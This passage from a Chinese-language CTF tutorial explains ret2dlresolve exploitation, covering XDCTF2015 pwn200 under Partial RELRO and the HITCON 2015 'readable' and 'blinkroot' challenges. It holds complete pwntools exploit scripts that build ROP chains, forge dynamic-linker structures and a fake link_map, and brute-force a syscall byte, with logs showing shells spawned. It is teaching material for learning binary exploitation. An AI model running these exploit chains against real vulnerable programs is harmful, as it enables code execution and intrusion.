rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
link_map_addr = u64(io.recv(8))
print(hex(link_map_addr))


# set l->l_info[VERSYMIDX(DT_VERSYM)] =  NULL
rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
rop.raw(csu(0, 1 ,elf.got['read'],0,link_map_addr+0x1c8,8))
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(p64(0))


rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
rop.raw(0x00000000004007a3) # 0x00000000004007a3: pop rdi; ret; 
rop.raw(bin_sh_addr)
rop.raw(resolve_call)
# rop.raw('a'*(256-len(rop.chain())))
io.send(rop.chain())
io.interactive()
```

這時，再次嘗試一下，發現

```assembly
 ► 0x7f5a187703ec <do_system+1180>       call   execve <execve>
        path: 0x7f5a188d50fa ◂— 0x68732f6e69622f /* '/bin/sh' */
        argv: 0x7fff68270410 —▸ 0x7f5a188d50ff ◂— 0x2074697865006873 /* 'sh' */
        envp: 0x7fff68270538 ◂— 0x6161616100000000
```

這時候 envp 被污染的數據就只有 0x61 了，即我們填充的數據 'a'。那就好辦了，我們只需要把所有的 pad 都替換爲 `\x00` 即可。

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_partial_relro_64")
elf = ELF("./main_partial_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400780
csu_end_addr = 0x40079A
vuln_addr = 0x400637

def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += '\x00' * 0x38
    return payload


def ret2dlresolve_x64(elf, store_addr, func_name, resolve_addr):
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    
    rel_plt = elf.get_section_by_name('.rela.plt').header.sh_addr
    relaent = elf.dynamic_value_by_tag("DT_RELAENT") # reloc entry size

    dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
    syment = elf.dynamic_value_by_tag("DT_SYMENT") # symbol entry size

    dynstr = elf.get_section_by_name('.dynstr').header.sh_addr


    # construct fake function string
    func_string_addr = store_addr
    resolve_data = func_name + "\x00"
    
    # construct fake symbol
    symbol_addr = store_addr+len(resolve_data)
    offset = symbol_addr - dynsym
    pad = syment - offset % syment # align syment size
    symbol_addr = symbol_addr+pad
    symbol = p32(func_string_addr-dynstr)+p8(0x12)+p8(0)+p16(0)+p64(0)+p64(0)
    symbol_index = (symbol_addr - dynsym)/24
    resolve_data +='\x00'*pad
    resolve_data += symbol

    # construct fake reloc 
    reloc_addr = store_addr+len(resolve_data)
    offset = reloc_addr - rel_plt
    pad = relaent - offset % relaent # align relaent size
    reloc_addr +=pad
    reloc_index = (reloc_addr-rel_plt)/24
    rinfo = (symbol_index<<32) | 7
    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(0)
    resolve_data +='\x00'*pad
    resolve_data +=write_reloc
    
    resolve_call = p64(plt0) + p64(reloc_index)
    return resolve_data, resolve_call
    

io.recvuntil('Welcome to XDCTF2015~!\n')
gdb.attach(io)

store_addr = bss_addr+0x100
sh = "/bin/sh\x00"

# construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./main_partial_relro_64")
offset = 112+8
rop.raw(offset*'\x00')
resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr, "system",elf.got["write"])
rop.raw(csu(0, 1 ,elf.got['read'],0,store_addr,len(resolve_data)+len(sh)))  
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
assert(len(rop.chain())<=256)
io.send(rop.chain())
# send resolve data
io.send(resolve_data+sh)
bin_sh_addr = store_addr+len(resolve_data)


# rop = ROP("./main_partial_relro_64")
# rop.raw(offset*'\x00')
# sh = "/bin/sh\x00"
# bin_sh_addr = store_addr+len(resolve_data)
# rop.raw(csu(0, 1 ,elf.got['read'],0,bin_sh_addr,len(sh)))
# rop.raw(vuln_addr)
# rop.raw("a"*(256-len(rop.chain())))
# io.send(rop.chain())
# io.send(sh)


# leak link_map addr
rop = ROP("./main_partial_relro_64")
rop.raw(offset*'\x00')
rop.raw(csu(0, 1 ,elf.got['write'],1,0x601008,8))
rop.raw(vuln_addr)
rop.raw('\x00'*(256-len(rop.chain())))
io.send(rop.chain())
link_map_addr = u64(io.recv(8))
print(hex(link_map_addr))


# set l->l_info[VERSYMIDX(DT_VERSYM)] =  NULL
rop = ROP("./main_partial_relro_64")
rop.raw(offset*'\x00')
rop.raw(csu(0, 1 ,elf.got['read'],0,link_map_addr+0x1c8,8))
rop.raw(vuln_addr)
rop.raw('\x00'*(256-len(rop.chain())))
io.send(rop.chain())
io.send(p64(0))


rop = ROP("./main_partial_relro_64")
rop.raw(offset*'\x00')
rop.raw(0x00000000004007a3) # 0x00000000004007a3: pop rdi; ret; 
rop.raw(bin_sh_addr)
rop.raw(resolve_call)
# rop.raw('\x00'*(256-len(rop.chain())))
io.send(rop.chain())
io.interactive()
```

這時候即可利用成功

```shell
❯ python exp-manual4.py
[+] Starting local process './main_partial_relro_64': pid 47378
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] running in new terminal: /usr/bin/gdb -q  "./main_partial_relro_64" 47378
[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)
[*] Loaded 14 cached gadgets for './main_partial_relro_64'
0x7f0d01125170
[*] Switching to interactive mode
$ whoami
iromise
```

##### Second try - no leak

可以看出，在上面的測試中，我們仍然利用 write 函數泄露了 link_map 的地址，那麼，如果程序中沒有輸出函數，我們是否還能夠發起利用呢？答案是可以的。我們再來看一下 `_dl_fix_up` 的實現

```c
    /* Look up the target symbol.  If the normal lookup rules are not
      used don't look in the global scope.  */
    // 判斷符號的可見性
    if (__builtin_expect(ELFW(ST_VISIBILITY)(sym->st_other), 0) == 0)
    {
        // 獲取符號的版本信息
        const struct r_found_version *version = NULL;
        if (l->l_info[VERSYMIDX(DT_VERSYM)] != NULL)
        {
            const ElfW(Half) *vernum = (const void *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);
            ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc->r_info)] & 0x7fff;
            version = &l->l_versions[ndx];
            if (version->hash == 0)
                version = NULL;
        }
        /* We need to keep the scope around so do some locking.  This is
         not necessary for objects which cannot be unloaded or when
         we are not using any threads (yet).  */
        int flags = DL_LOOKUP_ADD_DEPENDENCY;
        if (!RTLD_SINGLE_THREAD_P)
        {
            THREAD_GSCOPE_SET_FLAG();
            flags |= DL_LOOKUP_GSCOPE_LOCK;
        }
#ifdef RTLD_ENABLE_FOREIGN_CALL
        RTLD_ENABLE_FOREIGN_CALL;
#endif
        // 查詢待解析符號所在的目標文件的 link_map
        result = _dl_lookup_symbol_x(strtab + sym->st_name, l, &sym, l->l_scope,
                                     version, ELF_RTYPE_CLASS_PLT, flags, NULL);
        /* We are done with the global scope.  */
        if (!RTLD_SINGLE_THREAD_P)
            THREAD_GSCOPE_RESET_FLAG();
#ifdef RTLD_FINALIZE_FOREIGN_CALL
        RTLD_FINALIZE_FOREIGN_CALL;
#endif
        /* Currently result contains the base load address (or link map)
         of the object that defines sym.  Now add in the symbol
         offset.  */
        // 基於查詢到的 link_map 計算符號的絕對地址: result->l_addr + sym->st_value
        // l_addr 爲待解析函數所在文件的基地址
        value = DL_FIXUP_MAKE_VALUE(result,
                                    SYMBOL_ADDRESS(result, sym, false));
    }
    else
    {
        /* We already found the symbol.  The module (and therefore its load
         address) is also known.  */
        value = DL_FIXUP_MAKE_VALUE(l, SYMBOL_ADDRESS(l, sym, true));
        result = l;
    }
```

如果我們故意將 __builtin_expect(ELFW(ST_VISIBILITY)(sym->st_other), 0) 設置爲 0，那麼程序就會執行 else 分支。具體的，我們設置 sym->st_other 不爲 0 即可滿足這一條件。

```c
/* How to extract and insert information held in the st_other field.  */
#define ELF32_ST_VISIBILITY(o)        ((o) & 0x03)
/* For ELF64 the definitions are the same.  */
#define ELF64_ST_VISIBILITY(o)        ELF32_ST_VISIBILITY (o)
/* Symbol visibility specification encoded in the st_other field.  */
#define STV_DEFAULT        0                /* Default symbol visibility rules */
#define STV_INTERNAL        1                /* Processor specific hidden class */
#define STV_HIDDEN        2                /* Sym unavailable in other modules */
#define STV_PROTECTED        3                /* Not preemptible, not exported */
```

此時程序計算 value 的方式爲

```
value = l->l_addr + sym->st_value
```

通過查看 link_map 結構體的[定義](https://code.woboq.org/userspace/glibc/include/link.h.html#link_map)，可以知道 l_addr 是 link_map 的第一個成員，那麼如果我們僞造上述這兩個變量，並藉助於已有的被解析的函數地址，比如

- 僞造 link_map->l_addr 爲已解析函數與想要執行的目標函數的偏移值，如 addr_system-addr_xxx 
- 僞造 sym->st_value 爲已經解析過的某個函數的 got 表的位置，即相當於有了一個隱式的信息泄露

那就可以得到對應的目標地址。

```c
struct link_map
  {
    /* These first few members are part of the protocol with the debugger.
       This is the same format used in SVR4.  */
    ElfW(Addr) l_addr;                /* Difference between the address in the ELF
                                   file and the addresses in memory.  */
    char *l_name;                /* Absolute file name object was found in.  */
    ElfW(Dyn) *l_ld;                /* Dynamic section of the shared object.  */
    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */
    /* All following members are internal to the dynamic linker.
       They may change without notice.  */
    /* This is an element which is only ever different from a pointer to
       the very same copy of this type for ld.so when it is used in more
       than one namespace.  */
    struct link_map *l_real;
    /* Number of the namespace this link map belongs to.  */
    Lmid_t l_ns;
    struct libname_list *l_libname;
    /* Indexed pointers to dynamic section.
       [0,DT_NUM) are indexed by the processor-independent tags.
       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.
       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are
       indexed by DT_VERSIONTAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,
        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by
       DT_EXTRATAGIDX(tagvalue).
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,
        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are
       indexed by DT_VALTAGIDX(tagvalue) and
       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,
        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)
       are indexed by DT_ADDRTAGIDX(tagvalue), see <elf.h>.  */
    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM
                      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];
```

一般而言，至少有 __libc_start_main 已經解析過了。本例中，顯然不止這一個函數。

```
.got:0000000000600FF0 ; ===========================================================================
.got:0000000000600FF0
.got:0000000000600FF0 ; Segment type: Pure data
.got:0000000000600FF0 ; Segment permissions: Read/Write
.got:0000000000600FF0 ; Segment alignment 'qword' can not be represented in assembly
.got:0000000000600FF0 _got            segment para public 'DATA' use64
.got:0000000000600FF0                 assume cs:_got
.got:0000000000600FF0                 ;org 600FF0h
.got:0000000000600FF0 __libc_start_main_ptr dq offset __libc_start_main
.got:0000000000600FF0                                         ; DATA XREF: _start+24↑r
.got:0000000000600FF8 __gmon_start___ptr dq offset __gmon_start__
.got:0000000000600FF8                                         ; DATA XREF: _init_proc+4↑r
.got:0000000000600FF8 _got            ends
.got:0000000000600FF8
.got.plt:0000000000601000 ; ===========================================================================
.got.plt:0000000000601000
.got.plt:0000000000601000 ; Segment type: Pure data
.got.plt:0000000000601000 ; Segment permissions: Read/Write
.got.plt:0000000000601000 ; Segment alignment 'qword' can not be represented in assembly
.got.plt:0000000000601000 _got_plt        segment para public 'DATA' use64
.got.plt:0000000000601000                 assume cs:_got_plt
.got.plt:0000000000601000                 ;org 601000h
.got.plt:0000000000601000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
.got.plt:0000000000601008 qword_601008    dq 0                    ; DATA XREF: sub_400500↑r
.got.plt:0000000000601010 qword_601010    dq 0                    ; DATA XREF: sub_400500+6↑r
.got.plt:0000000000601018 off_601018      dq offset write         ; DATA XREF: _write↑r
.got.plt:0000000000601020 off_601020      dq offset strlen        ; DATA XREF: _strlen↑r
.got.plt:0000000000601028 off_601028      dq offset setbuf        ; DATA XREF: _setbuf↑r
.got.plt:0000000000601030 off_601030      dq offset read          ; DATA XREF: _read↑r
.got.plt:0000000000601030 _got_plt        ends
.got.plt:0000000000601030
```

與此同時，通過閱讀 `_dl_fixup` 函數的代碼，在設置  `__builtin_expect(ELFW(ST_VISIBILITY)(sym->st_other), 0)` 爲 0 後，我們可以發現，該函數主要依賴了 link_map 中 l_info 的內容。因此，我們同樣需要僞造該部分所需要的內容。

利用代碼如下

```python
from pwn import *
# context.log_level="debug"
context.terminal = ["tmux","splitw","-h"]
context.arch = "amd64"
io = process("./main_partial_relro_64")
elf = ELF("./main_partial_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400780
csu_end_addr = 0x40079A
vuln_addr = 0x400637


def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += '\x00' * 0x38
    return payload


def ret2dlresolve_with_fakelinkmap_x64(elf, fake_linkmap_addr, known_function_ptr, offset_of_two_addr):
    '''
    elf: is the ELF object

    fake_linkmap_addr: the address of the fake linkmap
    
    known_function_ptr: a already known pointer of the function, e.g., elf.got['__libc_start_main']
    
    offset_of_two_addr: target_function_addr - *(known_function_ptr), where
                        target_function_addr is the function you want to execute
    
    WARNING: assert *(known_function_ptr-8) & 0x0000030000000000 != 0 as ELF64_ST_VISIBILITY(o) = o & 0x3
    
    WARNING: be careful that fake_linkmap is 0x100 bytes length   

    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=0

    linkmap:
        0x00: l_addr = offset_of_two_addr
      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x8
        0x08: 17, tag of the JMPREL
        0x10: fake_linkmap_addr + 0x18, pointer of the fake JMPREL
      fake_JMPREL, addr = fake_linkmap_addr + 0x18
        0x18: p_r_offset, offset pointer to the resloved addr
        0x20: r_info
        0x28: append
      resolved addr
        0x30: r_offset
      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0x38
        0x38: 6, tag of the DT_SYMTAB
        0x40: known_function_ptr-8, p_fake_symbol_table
      command that you want to execute for system
        0x48: /bin/sh
      P_DT_STRTAB, pointer for DT_STRTAB
        0x68: fake a pointer, e.g., fake_linkmap_addr
      p_DT_SYMTAB, pointer for fake_DT_SYMTAB
        0x70: fake_linkmap_addr + 0x38
      p_DT_JMPREL, pointer for fake_DT_JMPREL
        0xf8: fake_linkmap_addr + 0x8
    '''
    plt0 = elf.get_section_by_name('.plt').header.sh_addr

    linkmap = p64(offset_of_two_addr & (2**64 - 1))
    linkmap += p64(17) + p64(fake_linkmap_addr + 0x18)
    # here we set p_r_offset = fake_linkmap_addr + 0x30 - two_offset
    # as void *const rel_addr = (void *)(l->l_addr + reloc->r_offset) and l->l_addr = offset_of_two_addr
    linkmap += p64((fake_linkmap_addr + 0x30 - offset_of_two_addr)
                   & (2**64 - 1)) + p64(0x7) + p64(0)
    linkmap += p64(0)
    linkmap += p64(6) + p64(known_function_ptr-8)
    linkmap += '/bin/sh\x00'           # cmd offset 0x48
    linkmap = linkmap.ljust(0x68, 'A')
    linkmap += p64(fake_linkmap_addr)
    linkmap += p64(fake_linkmap_addr + 0x38)
    linkmap = linkmap.ljust(0xf8, 'A')
    linkmap += p64(fake_linkmap_addr + 8)

    resolve_call = p64(plt0+6) + p64(fake_linkmap_addr) + p64(0)
    return (linkmap, resolve_call)


io.recvuntil('Welcome to XDCTF2015~!\n')
gdb.attach(io)

fake_linkmap_addr = bss_addr+0x100

# construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./main_partial_relro_64")
offset = 112+8
rop.raw(offset*'\x00')
libc = ELF('libc.so.6')
link_map, resolve_call = ret2dlresolve_with_fakelinkmap_x64(elf,fake_linkmap_addr, elf.got['read'],libc.sym['system']- libc.sym['read'])
rop.raw(csu(0, 1, elf.got['read'], 0, fake_linkmap_addr, len(link_map)))
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
assert(len(rop.chain()) <= 256)
io.send(rop.chain())
# send linkmap
io.send(link_map)

rop = ROP("./main_partial_relro_64")
rop.raw(offset*'\x00')
#0x00000000004007a1: pop rsi; pop r15; ret; 
rop.raw(0x00000000004007a1)  # stack align 16 bytes
rop.raw(0)
rop.raw(0)
rop.raw(0x00000000004007a3)  # 0x00000000004007a3: pop rdi; ret;
rop.raw(fake_linkmap_addr + 0x48)
rop.raw(resolve_call)
io.send(rop.chain())
io.interactive()
```

最終執行結果

```shell
❯ python exp-fake-linkmap.py
[+] Starting local process './main_partial_relro_64': pid 51197
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] running in new terminal: /usr/bin/gdb -q  "./main_partial_relro_64" 51197
[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)
[*] Loaded 14 cached gadgets for './main_partial_relro_64'
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode
$ whoami
iromise
```

雖然在這樣的攻擊中，我們不再需要信息泄露，但是我們需要知道目標機器的 libc，更具體的，我們需要知道目標函數和某個已經解析後的函數之間的偏移。

#### 基於工具僞造

感興趣的讀者可以自行嘗試使用相關的工具看是否可以攻擊成功。

### Full RELRO

## 2015-hitcon-readable

檢查一下文件權限，可以發現，該可執行文件只開啓了 NX 保護

```bash
❯ checksec readable
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-hitcon-quals-readable/readable'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

也就是說我們其實可以直接修改 dynamic 節的內容。但是，與 2015-xdctf-pwn200 不同，這裏棧溢出只能越界讀取 16 個字節，而上述例子中所使用的的 ret2csu 則需要大量的字節。因此，直接使用該方法是不行了。

我們來仔細分析下目前的情況，即我們可以越界控制 rbp、返回地址。考慮到 read 是使用 rbp 來索引 buffer 的

```
.text:0000000000400505                 lea     rax, [rbp-10h]
.text:0000000000400509                 mov     edx, 20h ; ' '  ; nbytes
.text:000000000040050E                 mov     rsi, rax        ; buf
.text:0000000000400511                 mov     edi, 0          ; fd
.text:0000000000400516                 mov     eax, 0
.text:000000000040051B                 call    _read
.text:0000000000400520                 leave
.text:0000000000400521                 retn
```

那如果我們控制 rbp 爲寫的地址加上 0x10，即 targetaddr+0x10，然後再跳轉到 0x400505，即棧的結構爲

```
return_addr -> 0x400505
rbp         -> target addr + 0x10
fake buf
```

那麼我們就可以控制程序在目標地址處寫 16 個字節。通過不斷地這樣操作，我們就可以不斷地讀取 16 個字節，從而達到讀取任意長字節的目的。

### 方法1：modify dynamic section

```python
from pwn import *
# context.log_level="debug"
context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./readable")
rop = ROP("./readable")
elf = ELF("./readable")

bss_addr = elf.bss()
csu_first_addr = 0x40058A
csu_second_addr = 0x400570

def csu_gadget(rbx, rbp, func_ptr, edi, rsi, rdx):
    # rdx = r13
    # rsi = r14
    # rdi = r15d
    # call [r12+rbx*8]
    # set rbx+1=rbp
    return flat([csu_first_addr, rbx, rbp, func_ptr, rdx,
                    rsi, edi, csu_second_addr], arch="amd64")+'a' * 0x38

def read16bytes(targetaddr, content):
    payload = 'a'*16
    payload += p64(targetaddr+0x10)
    payload += p64(0x400505)
    payload += content.ljust(16, "\x00")
    payload += p64(0x600890)
    payload += p64(0x400505)
    return payload

# stack privot to bss segment, set rsp = new_stack
fake_data_addr = bss_addr
new_stack = bss_addr+0x500

# modify .dynstr pointer in .dynamic section to a specific location
rop = csu_gadget(0, 1 ,elf.got['read'],0,0x600778+8,8)
# construct a fake dynstr section
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop += csu_gadget(0, 1 ,elf.got['read'],0,fake_data_addr,len(dynstr))
# read /bin/sh\x00
binsh_addr = fake_data_addr+len(dynstr)
rop += csu_gadget(0, 1 ,elf.got['read'],0,binsh_addr,len("/bin/sh\x00"))
# 0x0000000000400593: pop rdi; ret; 
rop +=p64(0x0000000000400593)+p64(binsh_addr)
# 0x0000000000400590: pop r14; pop r15; ret; 
rop +=p64(0x0000000000400590) +'a'*16 # stack align
# return to the second instruction of read'plt
rop +=p64(0x4003E6)

# gdb.attach(io)
# pause()
for i in range(0,len(rop),16):
    tmp = read16bytes(new_stack+i,rop[i:i+16])
    io.send(tmp)


# jump to the rop
payload = 'a'*16
payload += p64(new_stack-8)
payload += p64(0x400520)  # leave ret
io.send(payload)

# send fake dynstr addr
io.send(p64(fake_data_addr))
# send fake dynstr section
io.send(dynstr)
# send "/bin/sh\x00"
io.send("/bin/sh\x00")
io.interactive()
```

### 方法 2 - 標準 ROP

這個方法比較取巧，考慮到 read 函數很短，而且最後會調用系統調用，因此在 libc 的實現中會使用 syscall 指令，而同時我們可以修改 read 的 got 表，那如果我們把 read@got.plt 修改爲 syscall 的地址，同時佈置好相關的參數，即可執行系統調用。這裏我們控制 ROP 執行`execve("/bin/sh",NULL,NULL)`。

首先，我們需要爆破來尋找 syscall 具體的地址，我們可以考慮調用 write 函數來看是否真正執行了 syscall指令

```
def bruteforce():
    rop_addr = elf.bss()
    for i in range(0, 256):
        io = process("./readable")
        # modify read's got
        payload = csu_gadget(0, 1, elf.got["read"], 1, elf.got["read"], 0)
        # jump to read again
        # try to write ELF Header to stdout
        payload += csu_gadget(0, 1, elf.got["read"], 4, 0x400000, 1)
        # gdb.attach(io)
        # pause()
        for j in range(0, len(payload), 16):
            tmp = read16bytes(rop_addr+j, payload[j:j+16])
            io.send(tmp)
        # jump to the rop
        payload = 'a'*16
        payload += p64(rop_addr-8)
        payload += p64(0x400520)  # leave ret

        io.send(payload)
        io.send(p8(i))
        try:
            data = io.recv(timeout=0.5)
            if data == "\x7FELF":
                print(hex(i), data)
        except Exception as e:
            pass
        io.close()
```

即我們控制程序輸出 ELF 文件的頭，如果輸出了，那就說明成功了。此外，這裏我們使用了read 函數的返回值來控制 rax 寄存器的值，以便於控制具體想要執行哪個系統調用。運行結果如下

```bash
❯ python exp.py
('0x8f', '\x7fELF')
('0xc2', '\x7fELF')
```

通過對比 libc.so 確實可以看到，對應的偏移處具有 `syscall` 指令

```
.text:000000000011018F                 syscall                 ; LINUX - sys_read
.text:00000000001101C2                 syscall                 ; LINUX - sys_read
```

libc 的版本爲

```
❯ ./libc.so.6
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.2) stable release version 2.27.
```

需要注意，不同 libc 的偏移可能不一樣。

完整代碼如下

```python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'error'
elf = ELF("./readable")
csu_first_addr = 0x40058A
csu_second_addr = 0x400570


def read16bytes(targetaddr, content):
    payload = 'a'*16
    payload += p64(targetaddr+0x10)
    payload += p64(0x400505)
    payload += content.ljust(16, "\x00")
    payload += p64(0x600f00)
    payload += p64(0x400505)
    return payload


def csu_gadget(rbx, rbp, r12, r13, r14, r15):
    # rdx = r13
    # rsi = r14
    # rdi = r15d
    # call [r12+rbx*8]
    # set rbx+1=rbp
    payload = flat([csu_first_addr, rbx, rbp, r12, r13,
                    r14, r15, csu_second_addr], arch="amd64")
    return payload


def bruteforce():
    rop_addr = elf.bss()
    for i in range(0, 256):
        io = process("./readable")
        # modify read's got
        payload = csu_gadget(0, 1, elf.got["read"], 1, elf.got["read"], 0)
        # jump to read again
        # try to write ELF Header to stdout
        payload += csu_gadget(0, 1, elf.got["read"], 4, 0x400000, 1)
        # gdb.attach(io)
        # pause()
        for j in range(0, len(payload), 16):
            tmp = read16bytes(rop_addr+j, payload[j:j+16])
            io.send(tmp)
        # jump to the rop
        payload = 'a'*16
        payload += p64(rop_addr-8)
        payload += p64(0x400520)  # leave ret

        io.send(payload)
        io.send(p8(i))
        try:
            data = io.recv(timeout=0.5)
            if data == "\x7FELF":
                print(hex(i), data)
        except Exception as e:
            pass
        io.close()


def exp():
    rop_addr = elf.bss()
    io = process("./readable")
    execve_number = 59
    bin_sh_addr = elf.got["read"]-execve_number+1
    # modify the last byte of read's got
    payload = csu_gadget(0, 1, elf.got["read"], execve_number, bin_sh_addr, 0)
    # jump to read again, execve("/bin/sh\x00")
    payload += csu_gadget(0, 1, elf.got["read"],
                          bin_sh_addr+8, bin_sh_addr+8, bin_sh_addr)
    for j in range(0, len(payload), 16):
        tmp = read16bytes(rop_addr+j, payload[j:j+16])
        io.send(tmp)
    # jump to the rop
    payload = 'a'*16
    payload += p64(rop_addr-8)
    payload += p64(0x400520)  # leave ret
    io.send(payload)

    payload = '/bin/sh'.ljust(execve_number-1, '\x00')+p8(0xc2)
    io.send(payload)
    io.interactive()


if __name__ == "__main__":
    # bruteforce()
    exp()
```

## 2015-hitcon-quals-blinkroot

簡單看一下程序開的保護

```bash
❯ checksec blinkroot
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-hitcon-quals-blinkroot/blinkroot'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

發現程序開啓了 Canary 保護。

程序的基本邏輯爲

- 在 bss 指定位置處讀取 1024 個字節
- 關閉標準輸入，標準輸出，標準錯誤輸出。
- 然後可以在任意 16 字節對齊地址處設置16個字節，其中低8字節固定爲 0x10，高 8 字節完全可控。

顯然這裏是沒有信息泄露的，當然我們沒有辦法覆蓋返回地址來控制程序的執行流。但是既然程序沒有開啓 RELRO 保護，我們可以考慮修改 ELF 文件的字符串表。同時我們觀察到

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  if ( recvlen(0, (char *)&data, 0x400uLL) == 1024 )
  {
    close(0);
    close(1);
    close(2);
    *(__m128 *)((char *)&data + data) = _mm_loadh_ps(&dbl_600BC8);
    puts(s);
  }
  _exit(0);
}
```

程序會執行 puts 函數，而 puts 函數的具體地址爲 data 變量偏移 0x10。

```
.bss:0000000000600BC0                 public data
.bss:0000000000600BC0 data            dq ?                    ; DATA XREF: main+B↑o
.bss:0000000000600BC0                                         ; main+4D↑r ...
.bss:0000000000600BC8 ; double dbl_600BC8
.bss:0000000000600BC8 dbl_600BC8      dq ?                    ; DATA XREF: main+5C↑o
.bss:0000000000600BD0 ; char s[1008]
.bss:0000000000600BD0 s               db 3F0h dup(?)          ; DATA XREF: main+72↑o
.bss:0000000000600BD0 _bss            ends
```

因此，我們可以控制 s 爲 /bin/sh，同時控制字符串表中的 puts 函數爲 system 函數，那就可以調用 system 函數了。然而，理想很好，但是，我們發現

```
LOAD:00000000006009E8                 Elf64_Dyn <5, 400340h>  ; DT_STRTAB
LOAD:00000000006009F8                 Elf64_Dyn <6, 400280h>  ; DT_SYMTAB
LOAD:0000000000600A08                 Elf64_Dyn <0Ah, 69h>    ; DT_STRSZ
```

字符串表並不是 16 字節對齊的，因此不太行。那我們嘗試使用在開啓 Partial RELRO 下的思路吧。

由於不能泄露地址信息，所以我們可以採用僞造 linkmap 的思路，即

- 利用題目提供的任意寫的思路修改 linkmap 指向已經解析的地址
- 通過題目中接下來將要調用的 puts 函數來實現劫持控制流的目的

這裏我們可以發現 linkmap 存儲的地址爲 0x600B48，因此我們可以從 0x600B40 開始設置數據。

```assembly
.got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
.got.plt:0000000000600B48 qword_600B48    dq 0                    ; DATA XREF: sub_4004D0↑r
```

此外，需要注意的是 puts 函數在重定位表中的索引爲 1。因此，在構造 linkmap 時需要注意。

```assembly
.plt:00000000004004F0 ; int puts(const char *s)
.plt:00000000004004F0 _puts           proc near               ; CODE XREF: main+77↓p
.plt:00000000004004F0                 jmp     cs:off_600B60
.plt:00000000004004F0 _puts           endp
.plt:00000000004004F0
.plt:00000000004004F6 ; ---------------------------------------------------------------------------
.plt:00000000004004F6                 push    1
.plt:00000000004004FB                 jmp     sub_4004D0
```

利用腳本如下

```python
from pwn import *
